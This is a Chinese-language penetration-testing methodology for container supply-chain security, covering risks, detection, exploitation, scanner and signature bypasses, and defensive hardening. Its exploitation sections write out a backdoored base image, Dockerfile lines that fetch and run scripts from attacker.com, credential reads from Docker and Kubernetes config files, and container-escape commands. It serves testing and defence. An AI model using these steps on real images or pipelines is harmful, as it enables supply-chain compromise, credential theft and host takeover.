# 容器供应链安全方法论

---

# 第一部分：文档概述

## 1.1 编写目的
- 为渗透测试人员提供容器供应链安全测试的系统化方法
- 指导测试人员识别容器化应用供应链中的安全风险
- 帮助理解容器镜像、构建流程、运行环境中的攻击面和防御措施

## 1.2 适用范围
- 适用于使用 Docker、containerd、Podman 等容器技术的场景
- 适用于 Kubernetes 容器编排平台
- 适用于容器化 CI/CD 流程和云原生应用

## 1.3 读者对象
- 渗透测试工程师
- 容器安全研究人员
- DevSecOps 工程师
- Kubernetes 管理员

---

# 第二部分：核心渗透技术专题

## 专题一：容器供应链安全

### 2.1 技术介绍

容器供应链安全是指对容器镜像的构建、存储、分发、运行等全生命周期进行系统性安全评估，识别基础镜像漏洞、构建流程风险、镜像篡改、运行时威胁等安全问题。

**容器供应链架构：**

```
┌─────────────────────────────────────────────────────────────┐
│                  容器供应链架构                              │
├─────────────────────────────────────────────────────────────┤
│  开发阶段                                                   │
│  ├── Dockerfile 编写                                        │
│  ├── 基础镜像选择                                           │
│  └── 依赖安装                                               │
├─────────────────────────────────────────────────────────────┤
│  构建阶段                                                   │
│  ├── CI/CD 构建                                             │
│  ├── 镜像签名                                               │
│  └── 漏洞扫描                                               │
├─────────────────────────────────────────────────────────────┤
│  存储阶段                                                   │
│  ├── 镜像仓库 (Registry)                                    │
│  ├── 访问控制                                               │
│  └── 完整性保护                                             │
├─────────────────────────────────────────────────────────────┤
│  分发阶段                                                   │
│  ├── 镜像拉取                                               │
│  ├── 签名验证                                               │
│  └── 传输加密                                               │
├─────────────────────────────────────────────────────────────┤
│  运行阶段                                                   │
│  ├── 容器编排 (K8s)                                         │
│  ├── 运行时保护                                             │
│  └── 监控审计                                               │
└─────────────────────────────────────────────────────────────┘
```

**常见安全问题：**

| 问题类型 | 描述 | 危害等级 |
|---------|------|---------|
| 基础镜像漏洞 | 基础镜像存在已知漏洞 | 高 |
| 镜像投毒 | 恶意代码注入镜像 | 严重 |
| 凭证泄露 | Docker config 包含凭证 | 高 |
| 配置不当 | 容器以 root 运行等 | 高 |
| 无签名验证 | 镜像未签名或未验证 | 中 |
| 构建缓存污染 | 构建缓存被篡改 | 中 |
| 运行时逃逸 | 容器逃逸到宿主机 | 严重 |

### 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 使用公共镜像 | docker pull nginx | 镜像可能包含漏洞或后门 |
| 多阶段构建 | Dockerfile 多阶段 | 构建阶段可能被注入 |
| CI/CD 构建 | GitHub Actions 构建镜像 | 构建流程可能被篡改 |
| 镜像仓库 | Harbor/Nexus 存储镜像 | 仓库可能被入侵 |
| K8s 部署 | kubectl apply | 部署配置可能不当 |
| 自动更新 | 自动拉取 latest 镜像 | 可能拉取恶意镜像 |

### 2.3 漏洞探测方法

#### 2.3.1 黑盒测试

**步骤一：识别容器环境**
```bash
# 检查 Docker 端口
nmap -p 2375,2376 target.com

# 检查 Kubernetes API
nmap -p 6443,10250 target.com

# 检查 Registry
curl -I https://registry.target.com/v2/
```

**步骤二：检查公开镜像**
```bash
# 列出公开镜像
curl https://registry.target.com/v2/_catalog

# 检查镜像标签
curl https://registry.target.com/v2/image-name/tags/list

# 检查 Docker Hub
docker search target-app
```

**步骤三：漏洞扫描**
```bash
# 使用 Trivy 扫描
trivy image target-image:latest

# 使用 Clair 扫描
clair-scanner -c http://clair:6060 target-image:latest

# 使用 Anchore 扫描
anchore-cli image analyze target-image:latest
```

#### 2.3.2 白盒测试

**步骤一：审计 Dockerfile**
```dockerfile
# 检查基础镜像
FROM ubuntu:latest  # 风险：使用 latest

# 检查敏感操作
RUN curl http://example.com/script.sh | bash  # 风险：下载执行
RUN apt-get install -y sudo  # 风险：安装提权工具

# 检查凭证
ENV AWS_ACCESS_KEY_ID=xxx  # 风险：硬编码凭证
COPY .ssh/id_rsa /root/.ssh/  # 风险：复制密钥

# 检查用户
USER root  # 风险：以 root 运行
```

**步骤二：检查构建配置**
```yaml
# .github/workflows/docker-build.yml
# 检查构建流程
# 检查推送配置
# 检查 Secrets 使用
```

**步骤三：检查运行时配置**
```yaml
# Kubernetes deployment.yaml
apiVersion: apps/v1
kind: Deployment
spec:
  template:
    spec:
      containers:
      - name: app
        image: app:latest  # 风险：使用 latest
        securityContext:
          privileged: true  # 风险：特权容器
          runAsRoot: true  # 风险：root 运行
```

### 2.4 漏洞利用方法

#### 2.4.1 基础镜像投毒

```bash
# 1. 创建恶意基础镜像
cat > Dockerfile << EOF
FROM alpine:latest
RUN apk add --no-cache openssh
RUN echo 'root:backdoor' | chpasswd
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]
EOF

docker build -t alpine-secure:latest .
docker push alpine-secure:latest

# 2. 所有基于该镜像的派生镜像都受影响
```

#### 2.4.2 构建时注入

```bash
# 1. 入侵 CI/CD 系统
# 利用 Jenkins、GitHub Actions 漏洞

# 2. 修改 Dockerfile
sed -i '/^FROM/a RUN curl http://attacker.com/backdoor.sh | sh' Dockerfile

# 3. 构建并推送
docker build -t target-app:latest .
docker push target-app:latest
```

#### 2.4.3 凭证窃取

```bash
# 1. 窃取 Docker 凭证
cat ~/.docker/config.json
# 包含 registry 认证信息

# 2. 窃取 Kubernetes 凭证
cat ~/.kube/config
# 包含 K8s 集群访问凭证

# 3. 使用凭证访问仓库
docker login registry.target.com
docker push registry.target.com/malicious:latest
```

#### 2.4.4 运行时逃逸

```bash
# 1. 特权容器逃逸
docker run --privileged -it ubuntu bash
# 挂载宿主机文件系统
mount /dev/sda1 /mnt
# 访问宿主机

# 2. 敏感目录挂载
docker run -v /:/host -it ubuntu bash
# 直接访问宿主机根目录

# 3. Docker Socket 挂载
docker run -v /var/run/docker.sock:/var/run/docker.sock -it ubuntu bash
# 控制 Docker 守护进程
```

### 2.5 漏洞利用绕过方法

#### 2.5.1 绕过镜像扫描

```dockerfile
# 1. 使用多阶段构建隐藏恶意层
FROM alpine AS builder
RUN wget http://attacker.com/backdoor -O /tmp/backdoor

FROM alpine
COPY --from=builder /tmp/backdoor /backdoor
# 扫描器可能只扫描最终镜像

# 2. 使用环境变量延迟执行
ENV BACKDOOR_URL=http://attacker.com/backdoor
RUN curl $BACKDOOR_URL | sh

# 3. 分层投毒
# 将恶意代码分散到多个层中
```

#### 2.5.2 绕过签名验证

```bash
# 1. 如果目标未启用严格验证
# 推送无签名镜像

# 2. 利用签名过期
# 等待签名证书过期后推送

# 3. 针对不验证所有标签的场景
# 只篡改非 latest 标签
```

---

# 第三部分：附录

## 3.1 容器安全检查命令

```bash
# 镜像漏洞扫描
trivy image --severity HIGH,CRITICAL image:tag
grype image:tag

# 检查镜像历史
docker history --no-trunc image:tag

# 检查镜像签名
docker trust inspect --pretty image:tag

# 检查容器配置
docker inspect container_id

# 检查运行时行为
docker top container_id
docker exec container_id ps aux
```

## 3.2 安全 Dockerfile 示例

```dockerfile
# 使用具体版本的基础镜像
FROM node:18.16.0-alpine@sha256:abc123...

# 创建非 root 用户
RUN addgroup -g 1001 -S nodejs && \
    adduser -S nodejs -u 1001

# 设置工作目录
WORKDIR /app

# 复制依赖文件
COPY package*.json ./
RUN npm ci --only=production

# 复制应用代码
COPY --chown=nodejs:nodejs . .

# 切换到非 root 用户
USER nodejs

# 暴露端口
EXPOSE 3000

# 启动应用
CMD ["node", "server.js"]
```

## 3.3 容器安全配置建议

| 配置项 | 推荐设置 | 说明 |
|-------|---------|------|
| 基础镜像 | 使用具体版本 + digest | 避免使用 latest |
| 用户 | 非 root 用户 | 最小权限原则 |
| 镜像签名 | cosign/notary | 所有镜像签名 |
| 漏洞扫描 | 每次构建前 | 自动扫描 |
| 网络策略 | NetworkPolicy | 限制网络访问 |
| 安全上下文 | readOnlyRootFilesystem | 限制文件系统写入 |
| 资源限制 | CPU/Memory limits | 防止资源滥用 |

## 3.4 安全工具

| 工具名称 | 用途 | 链接 |
|---------|------|------|
| Trivy | 容器镜像扫描 | https://github.com/aquasecurity/trivy |
| Clair | 容器镜像扫描 | https://github.com/quay/clair |
| cosign | 容器签名 | https://github.com/sigstore/cosign |
| Falco | 运行时安全 | https://falco.org/ |
| OPA Gatekeeper | 策略执行 | https://open-policy-agent.github.io/gatekeeper |

---

## 参考资源

- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Kubernetes Security](https://kubernetes.io/docs/concepts/security/)
- [Container Supply Chain Security](https://www.cisa.gov/container-security)
- [SLSA Container Requirements](https://slsa.dev/spec/v1.0/requirements)
